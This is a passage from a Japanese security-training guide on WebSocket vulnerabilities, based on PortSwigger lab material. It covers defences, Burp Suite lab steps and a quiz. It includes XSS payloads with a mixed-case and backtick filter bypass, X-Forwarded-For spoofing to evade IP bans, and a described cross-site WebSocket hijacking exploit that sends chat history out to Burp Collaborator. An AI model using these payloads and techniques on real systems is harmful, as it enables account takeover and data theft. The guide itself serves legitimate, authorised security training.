> **代替手段**: なし（OWASP WSTG は無料公開。GitHub 版 https://github.com/OWASP/wstg でも同内容を読める）

---

## 8. WebSocket 接続をどう守るか

原典が示す、WebSocket の脆弱性リスクを最小化するための指針は 4 つである（逐語ベース）。

| # | 指針 | ねらい |
| --- | --- | --- |
| 1 | `wss://` プロトコル（TLS 上の WebSocket）を使う | 盗聴・改ざんを防ぐ |
| 2 | エンドポイント URL をハードコードし、ユーザー制御可能なデータを URL に組み込まない | 接続先のすり替えを防ぐ |
| 3 | ハンドシェイクを CSRF から保護する | CSWSH を防ぐ |
| 4 | 受信データを双方向とも untrusted として扱う | SQLi・XSS など入力起因脆弱性を防ぐ |

指針 4 の「双方向とも untrusted（信頼できない）として扱う」は特に大事である。サーバへ来るメッセージだけでなく、サーバからクライアントへ来るメッセージも安全に処理しなければならない。5 節の XSS は「サーバから他ユーザーのブラウザへ届いた本文」が無害化されていなかったために起きた。送信側・受信側の両方でエスケープ・検証を行うことが求められる。

〔補足〕CSWSH に対しては、7-6 のとおりサーバ側の `Origin` 検証と、ハンドシェイクへの CSRF トークン付与を組み合わせるのが実務的である。検出側としては、Burp Proxy の WebSockets history に想定外のメッセージ（`READY` の乱発や、外部ドメインへ送出される `fetch` 相当の挙動）が出ていないかを監視する観点が有効である。

---

## 手を動かす

以下は、自分で立てた検証環境または許可されたバグバウンティ・PortSwigger の公式ラボでのみ行うこと。

1. **WebSocket の有無を確認する**。Burp のブラウザで対象アプリのチャットや通知機能を操作し、Burp Proxy の「WebSockets history」タブにエントリが出るか見る。出れば WebSocket を使っている。

2. **メッセージを傍受・改変する**。Intercept をオンにして 1 通送り、Intercept タブに現れたメッセージ本文（多くは JSON）を書き換えて Forward する。まずは `<` を含む文字列を送り、送信直前に HTML エンコードされていないかを history で確認する。

3. **XSS を試す**。傍受したメッセージ本文を `<img src=1 onerror='alert(1)'>` に編集して転送し、描画側（自分の別ブラウザやラボのサポート担当者）で alert が出るか観察する。弾かれたら `` <img src=1 oNeRrOr=alert`1`> `` のように大文字小文字混在＋バッククォートで難読化して再試行する。

4. **ハンドシェイクを編集する**。メッセージを Repeater に送り、WebSocket URL 隣の鉛筆アイコンをクリック。clone または reconnect を選び、ハンドシェイクリクエストに `X-Forwarded-For: 1.1.1.1` を追加して「Connect」。接続が復活するか確認する。

5. **CSWSH をチェックする**。HTTP history でハンドシェイクリクエストを開き、`Cookie` だけでセッションが送られ、CSRF トークンや予測不能なパラメータが無いことを確認する。無ければ CSWSH の候補である。ラボ③では exploit サーバの Body に公式テンプレートを貼り、`your-websocket-url` を `wss://` 付きのハンドシェイク URL に、`your-collaborator-url` を Burp Collaborator のペイロードに置換して「View exploit」→ Collaborator でチャット履歴の到着を確認する。

6. **防御を検証する**。同じ対象で `Origin` を偽装したハンドシェイクが拒否されるか、`ws://`（非 TLS）が使われていないかを確認する。

---

## つまずきポイント

- **クライアント側フィルタを信じてしまう**。ラボ①のとおり、`<` の HTML エンコードはブラウザ内の処理にすぎず、Burp でネットワーク上のメッセージを直接書き換えれば無効化できる。クライアント側サニタイズはセキュリティ境界ではない。
- **`Sec-WebSocket-Key` を認証トークンと勘違いする**。これはキャッシングプロキシ対策のランダム値で、認証・セッション管理には使われない。CSRF 対策の代わりにもならない。
- **`ws://` と `wss://` の取り違え**。`wss://` が TLS 暗号化あり、`ws://` は暗号化なし。ラボ③では URL を `https://` から `wss://` に変える手順を忘れると接続できない。
- **`X-Forwarded-For` を過信する側にならない**。攻撃者が自由に付けられるヘッダを IP ベースの制限判断に使うと、`X-Forwarded-For: 1.1.1.1` 一発で回避される。
- **CSWSH を通常 CSRF と同一視する**。CSWSH は双方向で、受信（機密データ窃取）まで起こる点が決定的に異なる。
- **`Origin` 検証だけで安心する**。ブラウザ外のサーバ間リクエストでは `Origin` を偽装され得るため、CSRF トークン等の予測不能値を併用する。
- **難読化 XSS で詰まる**。`oNeRrOr` の大文字小文字混在（HTML 属性名は大小区別なし）や `` alert`1` `` のバッククォート呼び出し（丸括弧を避ける）でフィルタを越えられることがある。

---

## この節のまとめ

- WebSocket は HTTP 上で開始される双方向・全二重・長寿命の通信プロトコルで、低遅延やサーバ発メッセージ（例: 金融データのリアルタイムフィード）に使われる。
- 通常の HTTP で生じる脆弱性は事実上すべて WebSocket でも生じ得る（XSS, SQLi, XXE など）。
- 接続は HTTP 上のハンドシェイクで確立し、`Connection`/`Upgrade`/`Sec-WebSocket-Version`（通常 `13`）/`Sec-WebSocket-Key`/`Sec-WebSocket-Accept` が鍵となるヘッダである。
- `Sec-WebSocket-Accept` は Key ＋仕様固定文字列のハッシュで、誤設定・キャッシング対策であり認証用ではない。
- テストの中核ツールは Burp Suite。Proxy で傍受・改変、Repeater で再送・新規生成・ハンドシェイク編集（鉛筆アイコン）ができる。
- 入力起因脆弱性の大半はメッセージ本文の改ざんで発見・悪用でき、`{"message":"<img src=1 onerror='alert(1)'>"}` が代表的 XSS PoC である。
- ラボ①: クライアント側の `<` HTML エンコードは Burp 傍受で回避でき、サーバ／描画側で無害化しないと格納型 XSS になる。
- ハンドシェイク改変でしか見つからない脆弱性がある。HTTP ヘッダ（`X-Forwarded-For`）への誤った信頼、セッション処理の欠陥、独自ヘッダの攻撃面。
- ラボ②: `X-Forwarded-For: 1.1.1.1` で IP BAN を回避し、`` <img src=1 oNeRrOr=alert`1`> `` の難読化でフィルタを突破する 2 段構え。
- CSWSH は WebSocket ハンドシェイクに対する CSRF。Cookie のみのセッション管理＋予測不能値なしが成立条件である。
- CSWSH は通常 CSRF と違い双方向で、なりすまし操作に加えて機密データの受信（窃取）まで可能。
- ラボ③: exploit サーバ＋Burp Collaborator で `READY`→チャット履歴を exfiltrate し、資格情報を窃取してアカウント乗っ取りまで至る。
- 防御指針は 4 つ。`wss://` を使う、URL をハードコードしてユーザー入力を混ぜない、ハンドシェイクを CSRF から保護、受信データを双方向とも untrusted 扱いにする。
- CSWSH 対策としてサーバ側 `Origin` 検証は有効だが、偽装され得るため CSRF トークン併用が推奨される。
- クライアント側フィルタも `Sec-WebSocket-Key` も IP ヘッダも、セキュリティの根拠にはならない。

---

## 理解度チェック

1. WebSocket が通常の HTTP と最も違う点を 2 つ挙げよ。
   ▶ 答え: 双方向・全二重でいつでもどちらからでもメッセージを送れる点と、接続が長寿命で開いたまま保たれる（トランザクション的でない）点。

2. ハンドシェイクレスポンスの `Sec-WebSocket-Accept` は何のためにあるか。認証に使えるか。
   ▶ 答え: `Sec-WebSocket-Key` に仕様固定文字列を連結したハッシュで、誤設定サーバやキャッシングプロキシによる誤解を招くレスポンスを防ぐためのもの。認証やセッション管理には使われない。

3. ラボ①で、クライアントが `<` を HTML エンコードしていても XSS が成立するのはなぜか。
   ▶ 答え: そのエンコードはブラウザ内の処理にすぎず、Burp Proxy でネットワーク上のメッセージを直接 `<img src=1 onerror='alert(1)'>` に書き換えれば回避できるため。クライアント側フィルタはセキュリティ境界にならない。

4. ハンドシェイク改変でしか見つからない脆弱性の 3 類型を挙げよ。
   ▶ 答え: (1) HTTP ヘッダ（例 `X-Forwarded-For`）への誤った信頼、(2) セッション処理機構の欠陥、(3) 独自 HTTP ヘッダが導入する攻撃面。

5. ラボ②で `X-Forwarded-For: 1.1.1.1` を追加する目的は何か。
   ▶ 答え: XSS 試行でブロックされて IP が BAN され再接続に失敗するため、ハンドシェイクで IP アドレスを偽装して IP ベースの BAN を回避し、再接続するため。

6. `` <img src=1 oNeRrOr=alert`1`> `` がフィルタを回避できる仕組みを 2 点説明せよ。
   ▶ 答え: `oNeRrOr` の大文字小文字混在で `onerror` の単純一致フィルタをすり抜ける（HTML 属性名は大小区別なし）点と、`` alert`1` `` のバッククォート呼び出しで丸括弧 `()` を検知するフィルタを回避する点。

7. CSWSH が成立する条件を述べよ。
   ▶ 答え: WebSocket ハンドシェイクがセッション管理を HTTP Cookie のみに依存し、CSRF トークンやその他の予測不能値を含まないこと。

8. CSWSH が通常の CSRF より危険とされる理由は何か。
   ▶ 答え: 通常 CSRF は送信のみだが、CSWSH は乗っ取った WebSocket で双方向の対話が得られ、なりすまし操作に加えてサーバからの機密データ受信（窃取）まで可能なため。

9. ラボ③の PoC で `READY` を送るのはなぜか。受信データはどこへ送られるか。
   ▶ 答え: `READY` はサーバに過去のチャット履歴（機密データ）を返させるトリガーメッセージであるため。受信した `event.data` は `onmessage` 内の `fetch` で Burp Collaborator（`oastify.com` 等）へ送出される。

10. WebSocket 接続を安全にする 4 つの指針を挙げよ。
    ▶ 答え: `wss://`（TLS）を使う、エンドポイント URL をハードコードしユーザー制御データを混ぜない、ハンドシェイクを CSRF から保護する、受信データを双方向とも untrusted として扱う。

---

## 出典

- https://portswigger.net/web-security/websockets
- https://portswigger.net/web-security/websockets/what-are-websockets
- https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
- https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities
- https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities
- https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab
- https://portswigger.net/web-security/csrf#how-does-csrf-work
- https://portswigger.net/blog/oast-out-of-band-application-security-testing
- https://www.rfc-editor.org/rfc/rfc6455
- https://developer.mozilla.org/en-US/docs/Web/API/WebSocket
- https://owasp.org/www-project-web-security-testing-guide/
- https://portswigger.net/burp/documentation/desktop/tools/collaborator
- https://portswigger.net/burp/documentation/desktop/settings/tools/proxy#websocket-interception-rules

<!-- sources: https://portswigger.net/web-security/websockets, https://portswigger.net/web-security/websockets/what-are-websockets, https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking, https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities, https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities, https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab, https://portswigger.net/web-security/csrf#how-does-csrf-work, https://portswigger.net/blog/oast-out-of-band-application-security-testing, https://www.rfc-editor.org/rfc/rfc6455, https://developer.mozilla.org/en-US/docs/Web/API/WebSocket, https://owasp.org/www-project-web-security-testing-guide/, https://portswigger.net/burp/documentation/desktop/tools/collaborator, https://portswigger.net/burp/documentation/desktop/settings/tools/proxy#websocket-interception-rules -->
<!-- terms: WebSocket, 全二重, ハンドシェイク, wss, ws, Sec-WebSocket-Key, Sec-WebSocket-Accept, Sec-WebSocket-Version, Upgrade, Burp Suite, Burp Proxy, Burp Repeater, WebSockets history, Intercept, Send to Repeater, Edit and resend, クロスサイトWebSocketハイジャック, CSWSH, cross-origin WebSocket hijacking, CSRF, CSRFトークン, XSS, 格納型XSS, SQLインジェクション, XXE, OAST, Burp Collaborator, oastify, X-Forwarded-For, Origin, onerror, onopen, onmessage, exploitサーバ, READY, RFC 6455, TLS, ブラインド脆弱性, OWASP WSTG, WebSocket interception rules -->
<!-- self-read: https://www.rfc-editor.org/rfc/rfc6455 | 一次規格でサイト側 egress 制限により未取得 -->
<!-- self-read: https://developer.mozilla.org/en-US/docs/Web/API/WebSocket | サイト側の制限により未取得、実装リファレンス -->
<!-- self-read: https://portswigger.net/web-security/websockets | ラボ環境は要ログインで未取得、実演習用 -->
<!-- self-read: https://owasp.org/www-project-web-security-testing-guide/ | サイト側 egress 制限により未取得、WebSocket 防御・監査のテスト観点チェックリスト -->
